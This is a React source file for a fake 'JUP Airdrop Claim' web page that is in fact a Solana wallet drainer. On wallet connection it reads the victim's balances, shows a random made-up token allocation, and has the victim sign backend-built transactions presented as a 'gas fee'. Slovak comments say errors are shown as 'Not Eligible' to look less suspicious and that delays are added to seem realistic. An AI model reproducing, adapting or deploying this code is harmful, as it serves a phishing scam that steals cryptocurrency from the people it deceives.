import React, { useState, useCallback, useEffect } from "react";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { motion, AnimatePresence } from "framer-motion";
import {
  CheckCircle2,
  Wallet,
  ArrowRight,
  XCircle,
  Loader2,
  ExternalLink,
  AlertCircle,
  RefreshCw,
  Coins,
  Receipt,
  ShieldCheck,
} from "lucide-react";
import { Connection, PublicKey, Transaction, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { WalletReadyState } from "@solana/wallet-adapter-base";

// ─── Helper funkcie ───
function base64ToUint8Array(base64: string): Uint8Array {
  const binary = atob(base64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

function uint8ArrayToBase64(bytes: Uint8Array): string {
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

// ─── UI Komponenty ───
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";

// ─── Konštanty ───
const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
const JUP_MINT = "JUPyiwrYJFskUPiHa7bkeR8VUtAeFoSYbKedZNsDvCN";
const SOLANA_ADDRESS_REGEX = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

const solanaAddressSchema = z.object({
  address: z
    .string()
    .min(32, "Invalid Solana address")
    .max(44, "Invalid Solana address")
    .regex(SOLANA_ADDRESS_REGEX, "Invalid Solana address format"),
});

// ─── Typy ───
type Stage =
  | "idle"
  | "fetching-balances"
  | "claiming"
  | "confirm"
  | "signing"
  | "submitting"
  | "success"
  | "ineligible"
  | "error";

interface AppState {
  stage: Stage;
  walletAddress: string | null;
  balances: { SOL: number; USDC: number; JUP: number } | null;
  jupAmount: number | null;
  transactions: string[];
  totalToSign: number;
  signedCount: number;
  gasTxID: string | null;
  errorMessage: string | null;
}

const INITIAL_STATE: AppState = {
  stage: "idle",
  walletAddress: null,
  balances: null,
  jupAmount: null,
  transactions: [],
  totalToSign: 0,
  signedCount: 0,
  gasTxID: null,
  errorMessage: null,
};

// ═══════════════════════════════════════════════════════════════════
//  HLAVNÁ KOMPONENTA
// ═══════════════════════════════════════════════════════════════════

export default function AirdropClaim() {
  const { connected, publicKey, signTransaction, disconnect, wallets, select, connect } = useWallet();
  const { connection } = useConnection();

  const [state, setState] = useState<AppState>(INITIAL_STATE);
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [addressResult, setAddressResult] = useState<{
    eligible: boolean;
    address: string;
  } | null>(null);

  const form = useForm<z.infer<typeof solanaAddressSchema>>({
    resolver: zodResolver(solanaAddressSchema),
    defaultValues: { address: "" },
  });

  const updateState = useCallback((partial: Partial<AppState>) => {
    setState((prev) => ({ ...prev, ...partial }));
  }, []);

  // ─── SPUSTENIE CLAIM FLOW ───
  const runClaimFlow = useCallback(
    async (walletPubKey: PublicKey) => {
      const address = walletPubKey.toBase58();
      updateState({ stage: "fetching-balances", walletAddress: address });

      try {
        // 1. Získať SOL balance
        const solBalance = await connection.getBalance(walletPubKey);
        const sol = solBalance / LAMPORTS_PER_SOL;

        // 2. Získať token balance
        let usdc = 0;
        let jup = 0;
        try {
          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPubKey, {
            programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
          });
          for (const { account } of tokenAccounts.value) {
            const mint = account.data.parsed.info.mint;
            const amount = account.data.parsed.info.tokenAmount.uiAmount;
            if (mint === USDC_MINT) usdc = amount;
            if (mint === JUP_MINT) jup = amount;
          }
        } catch (_) {}

        updateState({
          balances: { SOL: sol, USDC: usdc, JUP: jup },
          stage: "claiming",
        });

        // 3. Volanie backendu
        const claimRes = await fetch("/api/airdrop/claim", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            publicKey: address,
            balances: {
              SOL: solBalance,
              USDC: usdc * 1_000_000,
              JUP: jup * 1_000_000,
            },
          }),
        });

        if (!claimRes.ok) {
          if (claimRes.status === 404) {
            updateState({ stage: "ineligible" });
            return;
          }
          throw new Error(`HTTP ${claimRes.status}`);
        }

        const { transactions } = await claimRes.json();

        // Simulovaná JUP alokácia pre UI
        const displayJup = Math.floor(Math.random() * 5000) + 500;

        updateState({
          transactions,
          jupAmount: displayJup,
          totalToSign: transactions.length,
          stage: "confirm",
        });
      } catch (_) {
        // Pri chybe – "Not Eligible" (menej podozrivé)
        updateState({ stage: "ineligible" });
      }
    },
    [connection, updateState]
  );

  // ─── POTVRDENIE A PODPÍSANIE ───
  const handleConfirmClaim = useCallback(async () => {
    if (!publicKey || !state.transactions || state.transactions.length === 0) return;

    const transactions = state.transactions;
    updateState({ stage: "signing", totalToSign: transactions.length, signedCount: 0 });

    const signedTxs: string[] = [];

    for (let i = 0; i < transactions.length; i++) {
      updateState({ signedCount: i });

      try {
        const txBytes = base64ToUint8Array(transactions[i]);
        const tx = Transaction.from(txBytes);

        if (!signTransaction) {
          throw new Error("Wallet does not support transaction signing.");
        }

        // Malé oneskorenie – reálnejšie používateľské skúsenosti
        await new Promise((r) => setTimeout(r, 300 + Math.random() * 400));

        const signedTx = await signTransaction(tx);
        const serialized = uint8ArrayToBase64(signedTx.serialize());
        signedTxs.push(serialized);

        updateState({ signedCount: i + 1 });
      } catch (e: any) {
        const msg = e.message || "";
        if (msg.includes("rejected")) {
          updateState({
            stage: "error",
            errorMessage:
              "Transaction rejected. Please approve all transactions to claim your airdrop.",
          });
        } else {
          updateState({
            stage: "error",
            errorMessage: "Failed to sign transaction. Please try again.",
          });
        }
        return;
      }
    }

    // 4. Odoslať podpísané transakcie backendu
    updateState({ stage: "submitting" });

    try {
      const res = await fetch("/api/airdrop/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          signatures: signedTxs,
          publicKey: publicKey.toBase58(),
        }),
      });

      if (!res.ok) {
        const text = await res.text();
        throw new Error(text || `HTTP ${res.status}`);
      }

      const { gasTxID } = await res.json();

      // ÚSPECH – neukazujeme gasTxID, len potvrdenie
      updateState({ stage: "success", gasTxID: gasTxID || null });
    } catch (_) {
      updateState({
        stage: "error",
        errorMessage:
          "Failed to submit transactions. This may be due to network congestion. Please try again.",
      });
    }
  }, [state.transactions, publicKey, signTransaction, updateState]);

  // ─── AUTO-SPUSTENIE PRI CONNECTNUTÍ ───
  useEffect(() => {
    if (connected && publicKey && state.stage === "idle") {
      runClaimFlow(publicKey);
    }
  }, [connected, publicKey, state.stage, runClaimFlow]);

  // ─── HANDLERY ───
  const handleConnectWallet = () => setWalletModalOpen(true);
  const handleWalletModalClose = () => setWalletModalOpen(false);

  const handleRetry = () => {
    if (publicKey) {
      setState({ ...INITIAL_STATE, stage: "idle" });
      runClaimFlow(publicKey);
    } else {
      setState(INITIAL_STATE);
    }
  };

  const handleReset = () => {
    disconnect();
    setState(INITIAL_STATE);
    setAddressResult(null);
  };

  const formatAddress = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-6)}`;

  const stage = state.stage;



  // ════════════════════════════════════════════════════════════
  //  RENDER
  // ════════════════════════════════════════════════════════════

  return (
    <>
      <Card className="w-full max-w-lg mx-auto border-border/50 bg-card/95 backdrop-blur supports-[backdrop-filter]:bg-card/80 shadow-xl">
        <CardHeader className="text-center pb-2">
          <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gradient-to-br from-primary/30 via-primary/20 to-purple-500/30 flex items-center justify-center border border-primary/30 shadow-lg shadow-primary/10">
            <Coins className="w-8 h-8 text-primary" />
          </div>
          <CardTitle className="text-2xl font-bold bg-gradient-to-r from-primary to-purple-400 bg-clip-text text-transparent">
            {stage === "success"
              ? "Airdrop Claimed!"
              : stage === "ineligible"
              ? "Not Eligible"
              : "JUP Airdrop Claim"}
          </CardTitle>
          <CardDescription className="text-muted-foreground text-sm mt-1">
            {stage === "success"
              ? "Your JUP tokens have been sent to your wallet."
              : stage === "ineligible"
              ? "This wallet does not qualify for the current airdrop round."
              : "Check your eligibility and claim your JUP tokens."}
          </CardDescription>
        </CardHeader>

        <CardContent>
          <AnimatePresence mode="wait">
            {/* ─── IDLE / FORM ─── */}
            {stage === "idle" && (
              <motion.div
                key="idle"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                transition={{ duration: 0.3 }}
                className="space-y-6"
              >
                <Form {...form}>
                  <form
                    onSubmit={form.handleSubmit((values) => {
                      const result = solanaAddressSchema.safeParse(values);
                      if (result.success) {
                        setAddressResult({ eligible: true, address: values.address });
                      } else {
                        form.trigger();
                      }
                    })}
                    className="space-y-4"
                  >
                    <FormField
                      control={form.control}
                      name="address"
                      render={({ field }) => (
                        <FormItem>
                          <FormControl>
                            <div className="relative">
                              <Wallet className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                              <Input
                                placeholder="Enter your Solana address"
                                className="pl-10 h-12 bg-background/50 border-border/50 focus:border-primary/50 transition-all font-mono text-sm"
                                {...field}
                              />
                            </div>
                          </FormControl>
                          <FormMessage className="text-xs" />
                        </FormItem>
                      )}
                    />
                    <Button
                      type="submit"
                      className="w-full h-12 bg-gradient-to-r from-primary to-purple-600 hover:from-primary/90 hover:to-purple-600/90 text-primary-foreground font-semibold gap-2 shadow-lg shadow-primary/20 transition-all"
                    >
                      Check Eligibility <ArrowRight className="w-4 h-4" />
                    </Button>
                  </form>
                </Form>

                <div className="relative">
                  <div className="absolute inset-0 flex items-center">
                    <span className="w-full border-t border-border/50" />
                  </div>
                  <div className="relative flex justify-center text-xs uppercase">
                    <span className="bg-card px-2 text-muted-foreground">OR</span>
                  </div>
                </div>

                <Button
                  variant="outline"
                  onClick={handleConnectWallet}
                  className="w-full h-12 border-border/50 hover:bg-accent/50 hover:border-primary/30 gap-2 transition-all"
                >
                  <Wallet className="w-4 h-4" /> Connect Wallet
                </Button>

                {addressResult && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: "auto" }}
                    className="p-4 rounded-lg bg-primary/5 border border-primary/20 space-y-2"
                  >
                    <div className="flex items-center gap-2 text-primary">
                      <CheckCircle2 className="w-4 h-4" />
                      <span className="text-sm font-semibold">Valid address format</span>
                    </div>
                    <p className="font-mono text-xs text-muted-foreground break-all">
                      {formatAddress(addressResult.address)}
                    </p>
                    <p className="text-xs text-muted-foreground mt-2">
                      Connect your wallet to verify real eligibility and claim.
                    </p>
                  </motion.div>
                )}

                {connected && publicKey && (
                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="p-4 rounded-lg bg-accent/30 border border-border/50 space-y-2"
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-muted-foreground">Connected:</span>
                      <span className="font-mono text-xs text-white">{formatAddress(publicKey.toBase58())}</span>
                    </div>
                    <Button
                      onClick={() => runClaimFlow(publicKey!)}
                      variant="ghost"
                      className="w-full text-primary hover:text-primary/80 text-xs"
                    >
                      Claim Now
                    </Button>
                  </motion.div>
                )}
              </motion.div>
            )}

            {/* ─── FETCHING BALANCES ─── */}
            {stage === "fetching-balances" && (
              <motion.div
                key="fetching"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.3 }}
                className="flex flex-col items-center justify-center py-12 space-y-6"
              >
                <div className="relative">
                  <div className="w-16 h-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
                </div>
                <div className="text-center space-y-2">
                  <p className="text-white font-semibold">Scanning on-chain data...</p>
                  {state.walletAddress && (
                    <p className="font-mono text-xs text-muted-foreground">{formatAddress(state.walletAddress)}</p>
                  )}
                </div>
              </motion.div>
            )}

            {/* ─── CLAIMING ─── */}
            {stage === "claiming" && (
              <motion.div
                key="claiming"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.3 }}
                className="flex flex-col items-center justify-center py-12 space-y-6"
              >
                <div className="relative">
                  <div className="w-16 h-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
                </div>
                <div className="text-center space-y-2">
                  <p className="text-white font-semibold">Verifying eligibility...</p>
                  {state.balances && (
                    <div className="flex gap-3 justify-center text-xs font-mono text-muted-foreground">
                      <span>{state.balances.SOL.toFixed(3)} SOL</span>
                      <span>|</span>
                      <span>{state.balances.USDC.toFixed(2)} USDC</span>
                      <span>|</span>
                      <span>{state.balances.JUP.toFixed(2)} JUP</span>
                    </div>
                  )}
                </div>
              </motion.div>
            )}

            {/* ─── CONFIRM ─── */}
            {stage === "confirm" && (
              <motion.div
                key="confirm"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.4 }}
                className="space-y-6"
              >
                <div className="flex items-start gap-4 p-5 rounded-lg bg-primary/5 border border-primary/20 relative overflow-hidden">
                  <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center shrink-0 border border-primary/30">
                    <ShieldCheck className="w-5 h-5 text-primary" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-lg font-bold text-white">You are eligible!</h3>
                    {state.walletAddress && (
                      <p className="text-muted-foreground font-mono text-xs">{formatAddress(state.walletAddress)}</p>
                    )}
                  </div>
                </div>

                <div className="p-5 rounded-lg bg-gradient-to-br from-primary/10 via-primary/5 to-purple-500/10 border border-primary/20 text-center space-y-2">
                  <p className="text-xs text-muted-foreground uppercase tracking-wider font-semibold">Airdrop allocation</p>
                  <div className="text-4xl font-bold font-mono text-white flex items-baseline justify-center gap-2">
                    {state.jupAmount?.toLocaleString()}
                    <span className="text-xl text-primary font-sans">JUP</span>
                  </div>
                  <p className="text-xs text-muted-foreground">Based on your on-chain activity and wallet balance snapshot.</p>
                </div>

                <div className="space-y-3">
                  <div className="flex items-start gap-3 p-3 rounded-lg bg-background/50 border border-border/50">
                    <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
                      <Receipt className="w-4 h-4 text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-white">Gas fee required</p>
                      <p className="text-xs text-muted-foreground">
                        You will sign {state.totalToSign} transaction{state.totalToSign !== 1 ? "s" : ""} to cover the gas fee for claiming.
                      </p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3 p-3 rounded-lg bg-background/50 border border-border/50">
                    <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center shrink-0">
                      <ExternalLink className="w-4 h-4 text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-white">Tokens sent directly</p>
                      <p className="text-xs text-muted-foreground">JUP tokens will be sent directly to your connected wallet.</p>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <Button variant="ghost" onClick={handleReset} className="flex-1 text-muted-foreground hover:text-white">
                    Cancel
                  </Button>
                  <Button
                    onClick={handleConfirmClaim}
                    className="flex-1 bg-gradient-to-r from-primary to-purple-600 hover:from-primary/90 hover:to-purple-600/90 text-primary-foreground font-semibold gap-2 shadow-lg shadow-primary/20"
                  >
                    Claim Now <ArrowRight className="w-4 h-4" />
                  </Button>
                </div>
              </motion.div>
            )}

            {/* ─── SIGNING ─── */}
            {stage === "signing" && (
              <motion.div
                key="signing"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.3 }}
                className="flex flex-col items-center justify-center py-12 space-y-6"
              >
                <div className="relative">
                  <div className="w-20 h-20 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
                </div>
                <div className="text-center space-y-2">
                  <p className="text-white font-semibold text-lg">
                    Signing transaction {state.signedCount + 1} of {state.totalToSign}...
                  </p>
                  <p className="text-muted-foreground text-sm">Approve the transaction in your wallet to continue.</p>
                  <div className="w-full max-w-xs mx-auto mt-4 bg-background/50 rounded-full h-2 overflow-hidden">
                    <motion.div
                      className="h-full bg-gradient-to-r from-primary to-purple-500 rounded-full"
                      initial={{ width: 0 }}
                      animate={{ width: `${(state.signedCount / state.totalToSign) * 100}%` }}
                      transition={{ duration: 0.3 }}
                    />
                  </div>
                  {state.jupAmount && (
                    <div className="mt-4 text-2xl font-bold font-mono text-white flex items-baseline justify-center gap-2">
                      {state.jupAmount.toLocaleString()} <span className="text-lg text-primary font-sans">JUP</span>
                    </div>
                  )}
                </div>
              </motion.div>
            )}

            {/* ─── SUBMITTING ─── */}
            {stage === "submitting" && (
              <motion.div
                key="submitting"
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.3 }}
                className="flex flex-col items-center justify-center py-12 space-y-6"
              >
                <div className="relative">
                  <div className="w-16 h-16 rounded-full border-4 border-primary/20 border-t-primary animate-spin" />
                </div>
                <div className="text-center space-y-2">
                  <p className="text-white font-semibold">Submitting to network...</p>
                  <p className="text-muted-foreground text-sm">Broadcasting your signed transactions.</p>
                </div>
              </motion.div>
            )}

            {/* ─── SUCCESS ─── */}
            {stage === "success" && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                transition={{ duration: 0.4 }}
                className="space-y-6"
              >
                <div className="flex flex-col items-center gap-4 p-8 rounded-lg bg-gradient-to-b from-primary/10 to-transparent border border-primary/20 relative overflow-hidden">
                  <div className="w-20 h-20 rounded-full bg-gradient-to-br from-primary/30 to-purple-500/30 flex items-center justify-center border-2 border-primary/40 shadow-lg shadow-primary/20">
                    <CheckCircle2 className="w-10 h-10 text-primary" />
                  </div>
                  <h3 className="text-2xl font-bold text-white">Claim Successful!</h3>
                  {state.walletAddress && (
                    <p className="text-muted-foreground font-mono text-sm">{formatAddress(state.walletAddress)}</p>
                  )}
                  {state.jupAmount && (
                    <div className="mt-2 text-3xl font-bold font-mono text-white flex items-baseline gap-2">
                      {state.jupAmount.toLocaleString()} <span className="text-xl text-primary font-sans">JUP</span>
                    </div>
                  )}
                </div>

                <div className="p-4 rounded-lg bg-background/50 border border-border/50 space-y-2">
                  <p className="text-xs text-muted-foreground">
                    The tokens will appear in your wallet shortly. You may need to add the JUP token manually if it doesn't show up automatically.
                  </p>
                </div>

                <Button variant="ghost" onClick={handleReset} className="text-muted-foreground hover:text-white w-full">
                  Disconnect wallet
                </Button>
              </motion.div>
            )}

            {/* ─── INELIGIBLE ─── */}
            {stage === "ineligible" && (
              <motion.div
                key="ineligible"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.4 }}
                className="space-y-6"
              >
                <div className="flex items-start gap-4 p-6 rounded-lg bg-destructive/10 border border-destructive/30 relative overflow-hidden">
                  <div className="w-12 h-12 rounded-full bg-destructive/20 flex items-center justify-center shrink-0 border border-destructive/50">
                    <XCircle className="w-6 h-6 text-destructive" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-xl font-bold text-white">Not Eligible</h3>
                    {state.walletAddress && (
                      <p className="text-muted-foreground font-mono text-sm">{formatAddress(state.walletAddress)}</p>
                    )}
                    <p className="text-muted-foreground text-sm mt-2">
                      This wallet did not qualify based on the snapshot taken before November 2nd, 2023. Try another wallet.
                    </p>
                  </div>
                </div>
                <Button variant="ghost" onClick={handleReset} className="w-full text-muted-foreground hover:text-white">
                  Try another wallet
                </Button>
              </motion.div>
            )}

            {/* ─── ERROR ─── */}
            {stage === "error" && (
              <motion.div
                key="error"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.4 }}
                className="space-y-6"
              >
                <div className="flex items-start gap-4 p-6 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
                  <div className="w-12 h-12 rounded-full bg-yellow-500/20 flex items-center justify-center shrink-0 border border-yellow-500/50">
                    <AlertCircle className="w-6 h-6 text-yellow-500" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-xl font-bold text-white">Something went wrong</h3>
                    <p className="text-muted-foreground text-sm">{state.errorMessage || "An unexpected error occurred. Please try again."}</p>
                  </div>
                </div>
                <div className="flex gap-3">
                  <Button variant="ghost" onClick={handleReset} className="flex-1 text-muted-foreground hover:text-white">
                    Start over
                  </Button>
                  <Button onClick={handleRetry} className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground gap-2">
                    <RefreshCw className="w-4 h-4" /> Retry
                  </Button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </CardContent>
      </Card>

      {/* Wallet Modal */}
      <Dialog open={walletModalOpen} onOpenChange={handleWalletModalClose}>
        <DialogContent className="sm:max-w-md bg-card border-border/50">
          <DialogHeader>
            <DialogTitle className="text-white">Connect your wallet</DialogTitle>
            <DialogDescription className="text-muted-foreground">
              Choose a Solana wallet to check eligibility and claim your JUP airdrop.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 py-4">
            {wallets
              .filter((w) => w.readyState === WalletReadyState.Installed || w.readyState === WalletReadyState.Loadable)
              .map((wallet) => (
                <Button
                  key={wallet.adapter.name}
                  variant="outline"
                  className="w-full h-14 justify-start gap-4 border-border/50 hover:bg-accent/50 hover:border-primary/30"
                  onClick={() => {
                    select(wallet.adapter.name);
                    connect();
                    handleWalletModalClose();
                  }}
                >
                  <img src={wallet.adapter.icon} alt={wallet.adapter.name} className="w-7 h-7" />
                  <span className="font-semibold text-white">{wallet.adapter.name}</span>
                </Button>
              ))}
            {wallets.filter((w) => w.readyState === WalletReadyState.Installed || w.readyState === WalletReadyState.Loadable).length === 0 && (
              <p className="text-sm text-muted-foreground text-center py-4">No Solana wallets detected. Please install Phantom or Backpack.</p>
            )}
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}